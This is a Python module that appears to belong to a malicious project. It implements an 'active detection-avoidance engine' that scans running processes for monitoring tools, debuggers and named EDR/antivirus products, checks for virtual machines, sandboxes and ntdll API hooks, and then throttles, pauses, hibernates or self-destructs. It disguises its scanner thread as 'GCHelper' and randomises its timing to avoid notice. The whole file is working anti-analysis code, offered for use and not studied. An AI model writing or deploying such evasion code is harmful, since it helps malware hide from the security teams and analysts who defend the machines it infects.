"""
Active detection-avoidance engine.

Detects monitoring tools, debuggers, security software, and VM/sandbox
environments, then triggers configurable threat responses.

Built entirely in-house using ``psutil`` (already a project dependency)
rather than third-party detection libraries that could be flagged as IOCs.

Usage::

    from stealth.detection_awareness import DetectionAwareness

    da = DetectionAwareness(config)
    da.start()              # background scanner thread
    level = da.threat_level # ThreatLevel enum
    da.stop()
"""
from __future__ import annotations

import ctypes
import enum
import logging
import os
import platform
import random
import re
import struct
import sys
import threading
import time
from pathlib import Path
from typing import Any

logger = logging.getLogger(__name__)


def _get_platform() -> str:
    return platform.system().lower()


# ── Threat levels ────────────────────────────────────────────────────

class ThreatLevel(enum.IntEnum):
    NONE = 0
    LOW = 1       # monitoring tool detected
    MEDIUM = 2    # debugger or security tool
    HIGH = 3      # active analysis / multi-signal


# ── Response actions ─────────────────────────────────────────────────

class ThreatResponse(str, enum.Enum):
    IGNORE = "ignore"
    THROTTLE = "throttle"
    PAUSE = "pause"
    HIBERNATE = "hibernate"
    SELF_DESTRUCT = "self_destruct"


# ── Process-name databases ───────────────────────────────────────────

_MONITOR_PROCESSES: dict[str, set[str]] = {
    "darwin": {
        "activity monitor", "console", "instruments", "dtrace", "fs_usage",
        "lsof", "tcpdump", "wireshark", "little snitch", "lulu",
        "blockblock", "knockknock", "oversight", "reikey", "taskexplorer",
        "netiquette", "processmonitor", "filemon", "dtruss",
    },
    "linux": {
        "htop", "top", "strace", "ltrace", "tcpdump", "wireshark",
        "tshark", "auditd", "sysdig", "bpftrace", "perf", "gdb", "lldb",
        "iotop", "nethogs", "bandwhich", "nmon", "atop", "ftrace",
        "valgrind",
    },
    "windows": {
        "taskmgr.exe", "procmon.exe", "procexp.exe", "procexp64.exe",
        "wireshark.exe", "fiddler.exe", "x64dbg.exe", "x32dbg.exe",
        "ollydbg.exe", "ida.exe", "ida64.exe", "windbg.exe",
        "apimonitor.exe", "autoruns.exe", "tcpview.exe", "rammap.exe",
        "vmmap.exe", "handle.exe", "listdlls.exe",
    },
}

_EDR_AV_PROCESSES: set[str] = {
    # CrowdStrike
    "falcon-sensor", "csfalconservice", "csagent", "csfalconcontainer",
    # SentinelOne
    "sentinelagent", "sentinelone-agent", "sentinelhelperdaemon",
    "sentinelstaticengine",
    # Carbon Black
    "cb", "cbdefense", "cbosxsensorservice", "repmgr", "cbdefensesensor",
    # Microsoft Defender
    "msmpeng.exe", "mssense.exe", "sensecncproxy.exe", "senseir.exe",
    "mpcmdrun.exe",
    # Sophos
    "sophosscand", "sophosantivirus", "sophoswebintelligence",
    "sophosfileprotection", "sophossps",
    # Kaspersky
    "avp.exe", "avpui.exe", "kavtray.exe", "klnagent.exe",
    # ESET
    "ekrn.exe", "egui.exe", "esets_daemon",
    # Bitdefender
    "bdagent.exe", "bdservicehost.exe", "bdntwrk.exe", "vsserv.exe",
    # Malwarebytes
    "mbam.exe", "mbamservice.exe", "rtprotectionsvc.exe",
    # McAfee
    "mcafeeframework", "mfemactl", "mfetp", "mcshield.exe",
    # Trend Micro
    "ds_agent", "coreserviceshell", "ntrtscan.exe", "pccntmon.exe",
    # Norton / Symantec
    "ccsvchst.exe", "nortonsecurity.exe", "symcorpui.exe", "smc.exe",
    # Palo Alto Cortex XDR
    "traps_agent", "cyserver.exe",
    # Cylance
    "cylancesvc.exe", "cylanceui.exe",
    # F-Secure
    "fshoster.exe", "fsav.exe",
    # Webroot
    "wrsa.exe", "wrcoreservice.exe",
    # macOS built-in
    "xprotect", "mrt", "gatekeeper",
}

# ── VM/Sandbox indicators ────────────────────────────────────────────

_VM_MAC_PREFIXES = {
    "00:0c:29",  # VMware
    "00:50:56",  # VMware
    "08:00:27",  # VirtualBox
    "00:15:5d",  # Hyper-V
    "52:54:00",  # QEMU/KVM
    "00:16:3e",  # Xen
}

_VM_PRODUCT_NAMES = {
    "virtualbox", "vmware", "qemu", "kvm", "xen",
    "hyper-v", "parallels", "bochs", "virtual machine",
}


class DetectionAwareness:
    """Active threat-detection and response engine.

    Parameters
    ----------
    config : dict
        The ``stealth.detection`` section of the configuration.
    """

    def __init__(self, config: dict[str, Any] | None = None) -> None:
        cfg = config or {}
        self._enabled: bool = bool(cfg.get("enabled", True))
        self._scan_min: float = float(cfg.get("scan_interval_min", 10))
        self._scan_max: float = float(cfg.get("scan_interval_max", 60))
        self._monitor_response = ThreatResponse(cfg.get("monitor_response", "throttle"))
        self._debugger_response = ThreatResponse(cfg.get("debugger_response", "pause"))
        self._security_response = ThreatResponse(cfg.get("security_tool_response", "pause"))
        self._vm_detection: bool = bool(cfg.get("vm_detection", True))
        self._vm_response = ThreatResponse(cfg.get("vm_response", "ignore"))
        self._platform = _get_platform()

        self._threat_level = ThreatLevel.NONE
        self._active_response = ThreatResponse.IGNORE
        self._detections: list[str] = []
        self._api_hooks_detected: bool = False
        self._lock = threading.Lock()

        self._scanner_thread: threading.Thread | None = None
        self._stop_event = threading.Event()

    # ── Public API ───────────────────────────────────────────────────

    @property
    def threat_level(self) -> ThreatLevel:
        with self._lock:
            return self._threat_level

    @property
    def active_response(self) -> ThreatResponse:
        with self._lock:
            return self._active_response

    @property
    def detections(self) -> list[str]:
        with self._lock:
            return list(self._detections)

    def start(self) -> None:
        """Start the background scanner thread."""
        if not self._enabled or self._scanner_thread is not None:
            return
        self._stop_event.clear()
        self._scanner_thread = threading.Thread(
            target=self._scan_loop,
            name="GCHelper",  # innocuous name
            daemon=True,
        )
        self._scanner_thread.start()
        logger.debug("Detection awareness scanner started")

    def stop(self) -> None:
        self._stop_event.set()
        if self._scanner_thread and self._scanner_thread.is_alive():
            self._scanner_thread.join(timeout=5)
        self._scanner_thread = None

    def scan_once(self) -> ThreatLevel:
        """Run a single scan cycle and return the threat level."""
        detections: list[str] = []
        level = ThreatLevel.NONE
        response = ThreatResponse.IGNORE

        # 1 & 3. Single-pass process scan for monitors + security tools
        monitors, security = self._scan_processes()
        if monitors:
            detections.extend(f"monitor:{m}" for m in monitors)
            level = max(level, ThreatLevel.LOW)
            response = max(response, self._monitor_response, key=lambda r: _RESPONSE_SEVERITY.get(r, 0))

        if security:
            detections.extend(f"security:{s}" for s in security)
            level = max(level, ThreatLevel.MEDIUM)
            response = max(response, self._security_response, key=lambda r: _RESPONSE_SEVERITY.get(r, 0))

        # 2. Check for debuggers
        if self._check_debugger():
            detections.append("debugger:active")
            level = max(level, ThreatLevel.MEDIUM)
            response = max(response, self._debugger_response, key=lambda r: _RESPONSE_SEVERITY.get(r, 0))

        # 4. VM detection (if enabled)
        if self._vm_detection and self._check_vm():
            detections.append("vm:detected")
            # VM alone doesn't raise level above current
            response = max(response, self._vm_response, key=lambda r: _RESPONSE_SEVERITY.get(r, 0))

        # 5. API hook detection
        api_hooks_detected = False
        if self._check_api_hooks():
            api_hooks_detected = True
            detections.append("api_hooks:detected")
            level = max(level, ThreatLevel.MEDIUM)
            response = max(response, self._security_response, key=lambda r: _RESPONSE_SEVERITY.get(r, 0))

        # Multi-signal escalation
        if len(detections) >= 3:
            level = ThreatLevel.HIGH

        with self._lock:
            self._threat_level = level
            self._active_response = response
            self._detections = detections
            self._api_hooks_detected = api_hooks_detected

        return level

    def should_throttle(self) -> bool:
        r = self.active_response
        return r in (ThreatResponse.THROTTLE, ThreatResponse.PAUSE, ThreatResponse.HIBERNATE)

    def should_pause(self) -> bool:
        r = self.active_response
        return r in (ThreatResponse.PAUSE, ThreatResponse.HIBERNATE)

    def should_self_destruct(self) -> bool:
        return self.active_response == ThreatResponse.SELF_DESTRUCT

    def get_status(self) -> dict[str, Any]:
        with self._lock:
            return {
                "enabled": self._enabled,
                "threat_level": self._threat_level.name,
                "active_response": self._active_response.value,
                "detections": list(self._detections),
                "api_hooks_detected": self._api_hooks_detected,
            }

    # ── Scanner loop ─────────────────────────────────────────────────

    def _scan_loop(self) -> None:
        while not self._stop_event.is_set():
            try:
                self.scan_once()
            except Exception as exc:
                logger.debug("Detection scan error: %s", exc)

            # Randomised interval to avoid detection of the scanner itself
            wait = random.uniform(self._scan_min, self._scan_max)
            self._stop_event.wait(wait)

    # ── Detection methods ────────────────────────────────────────────

    def _scan_processes(self) -> tuple[list[str], list[str]]:
        """Single-pass process scan returning (monitors, security_tools).

        Iterates ``psutil.process_iter`` once and classifies each process
        name against both ``_MONITOR_PROCESSES`` and ``_EDR_AV_PROCESSES``.
        """
        monitors: list[str] = []
        security: list[str] = []
        monitor_set = _MONITOR_PROCESSES.get(self._platform, set())
        try:
            import psutil
            for proc in psutil.process_iter(["name"]):
                try:
                    name = proc.info.get("name", "") or ""
                    name_lower = name.lower()
                    if monitor_set and name_lower in monitor_set:
                        monitors.append(name)
                    if name_lower in _EDR_AV_PROCESSES:
                        security.append(name)
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
        except ImportError:
            pass
        return monitors, security

    def _check_monitors(self) -> list[str]:
        """Scan running processes for known monitoring tools."""
        monitors, _ = self._scan_processes()
        return monitors

    def _check_security_tools(self) -> list[str]:
        """Scan running processes for known EDR/AV software."""
        _, security = self._scan_processes()
        return security

    def _check_debugger(self) -> bool:
        """Multi-layer debugger detection."""
        # Python-level: sys.gettrace
        if sys.gettrace() is not None:
            return True

        # Python 3.12+ sys.monitoring
        try:
            import sys as _sys
            if hasattr(_sys, "monitoring"):
                # DEBUGGER_ID = 0
                tool = _sys.monitoring.get_tool(0)
                if tool is not None:
                    return True
        except Exception as exc:
            logger.debug("Detection check failed: %s", exc)

        plat = self._platform
        if plat == "linux":
            return self._check_debugger_linux()
        if plat == "darwin":
            return self._check_debugger_macos()
        if plat == "windows":
            return self._check_debugger_windows()
        return False

    @staticmethod
    def _check_debugger_linux() -> bool:
        """Check ``/proc/self/status`` for TracerPid."""
        try:
            status = Path("/proc/self/status").read_text()
            for line in status.splitlines():
                if line.startswith("TracerPid:"):
                    tracer_pid = int(line.split(":")[1].strip())
                    return tracer_pid != 0
        except Exception as exc:
            logger.debug("Detection check failed: %s", exc)
        return False

    @staticmethod
    def _check_debugger_macos() -> bool:
        """macOS debugger check via sysctl KERN_PROC (non-destructive).

        Inspects the P_TRACED flag in the kernel process info struct.
        This is a read-only check that does NOT alter process state,
        unlike the previous PT_DENY_ATTACH approach which permanently
        prevented debugger attachment as a side effect.
        """
        try:
            import struct
            from ctypes.util import find_library

            libc_name = find_library("c")
            if not libc_name:
                return False
            libc = ctypes.CDLL(libc_name, use_errno=True)

            # sysctl MIB: CTL_KERN=1, KERN_PROC=14, KERN_PROC_PID=1, pid
            pid = os.getpid()
            mib = (ctypes.c_int * 4)(1, 14, 1, pid)

            # kinfo_proc is ~648 bytes on macOS (varies slightly by arch)
            buf_size = ctypes.c_size_t(1024)
            buf = ctypes.create_string_buffer(buf_size.value)

            result = libc.sysctl(
                mib, 4, buf, ctypes.byref(buf_size), None, 0
            )
            if result != 0:
                return False

            # P_TRACED flag (0x00000800) is at kp_proc.p_flag offset.
            # kp_proc.p_flag is an int32 at byte offset 32 in the struct.
            if buf_size.value >= 36:
                p_flag = struct.unpack_from("i", buf.raw, 32)[0]
                P_TRACED = 0x00000800
                return bool(p_flag & P_TRACED)
        except Exception as exc:
            logger.debug("Detection check failed: %s", exc)
        return False

    @staticmethod
    def _check_debugger_windows() -> bool:
        """Check ``IsDebuggerPresent`` and ``CheckRemoteDebuggerPresent``."""
        try:
            k32 = ctypes.windll.kernel32  # type: ignore[attr-defined]
            if k32.IsDebuggerPresent():
                return True
            remote = ctypes.c_int(0)
            handle = k32.GetCurrentProcess()
            k32.CheckRemoteDebuggerPresent(handle, ctypes.byref(remote))
            if remote.value:
                return True
        except Exception as exc:
            logger.debug("Detection check failed: %s", exc)
        return False

    # ── API hook detection ────────────────────────────────────────────

    def _check_api_hooks(self) -> bool:
        """Detect API hooking / function interception.

        On Windows, compares the first 16 bytes of key NT functions loaded
        from the on-disk ``ntdll.dll`` against the in-memory copy to detect
        inline hooks placed by EDR/AV or analysis tools.

        On macOS/Linux, checks for ``LD_PRELOAD`` or ``DYLD_INSERT_LIBRARIES``
        environment variables which are commonly used to inject shared
        libraries that intercept API calls.

        Returns
        -------
        bool
            True if API hooks are detected, False otherwise.
        """
        plat = self._platform
        if plat == "windows":
            return self._check_api_hooks_windows()
        return self._check_api_hooks_unix()

    @staticmethod
    def _check_api_hooks_windows() -> bool:
        """Compare on-disk ntdll.dll function prologues with in-memory versions."""
        try:
            import ctypes
            from ctypes import wintypes

            # Load the in-memory ntdll
            ntdll_mem = ctypes.windll.ntdll  # type: ignore[attr-defined]

            # Load a fresh copy directly from disk for comparison
            system_root = os.environ.get("SystemRoot", r"C:\Windows")
            ntdll_path = os.path.join(system_root, "System32", "ntdll.dll")
            ntdll_disk = ctypes.CDLL(ntdll_path)

            key_functions = ["NtWriteFile", "NtCreateFile", "NtReadFile"]
            compare_bytes = 16

            for func_name in key_functions:
                try:
                    # Get function addresses
                    mem_addr = ctypes.cast(
                        getattr(ntdll_mem, func_name),
                        ctypes.c_void_p
                    ).value
                    disk_addr = ctypes.cast(
                        getattr(ntdll_disk, func_name),
                        ctypes.c_void_p
                    ).value

                    if mem_addr is None or disk_addr is None:
                        continue

                    # Read first N bytes from each
                    mem_bytes = (ctypes.c_ubyte * compare_bytes).from_address(mem_addr)
                    disk_bytes = (ctypes.c_ubyte * compare_bytes).from_address(disk_addr)

                    if bytes(mem_bytes) != bytes(disk_bytes):
                        logger.debug(
                            "API hook detected: %s prologue mismatch", func_name
                        )
                        return True

                except (AttributeError, OSError, ValueError):
                    continue

        except Exception as exc:
            logger.debug("API hook check (Windows) failed: %s", exc)
        return False

    @staticmethod
    def _check_api_hooks_unix() -> bool:
        """Check for LD_PRELOAD / DYLD_INSERT_LIBRARIES injection."""
        # LD_PRELOAD — Linux library injection
        ld_preload = os.environ.get("LD_PRELOAD", "")
        if ld_preload.strip():
            logger.debug("API hook indicator: LD_PRELOAD=%s", ld_preload)
            return True

        # DYLD_INSERT_LIBRARIES — macOS library injection
        dyld_insert = os.environ.get("DYLD_INSERT_LIBRARIES", "")
        if dyld_insert.strip():
            logger.debug(
                "API hook indicator: DYLD_INSERT_LIBRARIES=%s", dyld_insert
            )
            return True

        return False

    # ── VM / Sandbox detection ───────────────────────────────────────

    def _check_vm(self) -> bool:
        """Cross-platform VM/sandbox detection."""
        score = 0

        # MAC address prefix check
        if self._check_vm_mac():
            score += 2

        # Hardware heuristics
        if self._check_vm_specs():
            score += 1

        # Platform-specific
        plat = self._platform
        if plat == "linux" and self._check_vm_linux():
            score += 2
        elif plat == "darwin" and self._check_vm_macos():
            score += 2
        elif plat == "windows" and self._check_vm_windows():
            score += 2

        return score >= 2  # Need at least 2 signals

    @staticmethod
    def _check_vm_mac() -> bool:
        """Check network interface MAC prefixes for VM vendors."""
        try:
            import psutil
            addrs = psutil.net_if_addrs()
            for iface, snic_list in addrs.items():
                for snic in snic_list:
                    if snic.family is not None and hasattr(snic, "address"):
                        addr = str(snic.address).lower()
                        prefix = addr[:8]
                        if prefix in _VM_MAC_PREFIXES:
                            return True
        except Exception as exc:
            logger.debug("Detection check failed: %s", exc)
        return False

    @staticmethod
    def _check_vm_specs() -> bool:
        """Heuristic: very low disk/RAM/cores suggest a VM."""
        try:
            import psutil
            # RAM < 2 GB
            mem = psutil.virtual_memory()
            if mem.total < 2 * 1024 * 1024 * 1024:
                return True
            # CPU cores < 2
            if (os.cpu_count() or 4) < 2:
                return True
            # Disk < 60 GB — use platform-appropriate root path
            disk_path = Path.home().anchor  # "/" on Unix, "C:\\" on Windows
            try:
                disk = psutil.disk_usage(disk_path)
                if disk.total < 60 * 1024 * 1024 * 1024:
                    return True
            except OSError:
                pass
        except Exception as exc:
            logger.debug("Detection check failed: %s", exc)
        return False

    @staticmethod
    def _check_vm_linux() -> bool:
        """Read DMI product name for VM keywords."""
        try:
            product = Path("/sys/class/dmi/id/product_name").read_text().strip().lower()
            for name in _VM_PRODUCT_NAMES:
                if name in product:
                    return True
        except Exception as exc:
            logger.debug("Detection check failed: %s", exc)
        return False

    @staticmethod
    def _check_vm_macos() -> bool:
        """Check system_profiler for VM model identifiers."""
        try:
            import subprocess
            out = subprocess.check_output(
                ["system_profiler", "SPHardwareDataType"],
                timeout=5,
                stderr=subprocess.DEVNULL,
            ).decode("utf-8", errors="ignore").lower()
            for name in _VM_PRODUCT_NAMES:
                if name in out:
                    return True
        except Exception as exc:
            logger.debug("Detection check failed: %s", exc)
        return False

    @staticmethod
    def _check_vm_windows() -> bool:
        """WMI query for VM manufacturer strings."""
        try:
            import subprocess
            out = subprocess.check_output(
                ["wmic", "computersystem", "get", "manufacturer,model"],
                timeout=5,
                stderr=subprocess.DEVNULL,
            ).decode("utf-8", errors="ignore").lower()
            for name in _VM_PRODUCT_NAMES:
                if name in out:
                    return True
        except Exception as exc:
            logger.debug("Detection check failed: %s", exc)
        return False


# Severity ordering for max() comparisons
_RESPONSE_SEVERITY: dict[ThreatResponse, int] = {
    ThreatResponse.IGNORE: 0,
    ThreatResponse.THROTTLE: 1,
    ThreatResponse.PAUSE: 2,
    ThreatResponse.HIBERNATE: 3,
    ThreatResponse.SELF_DESTRUCT: 4,
}
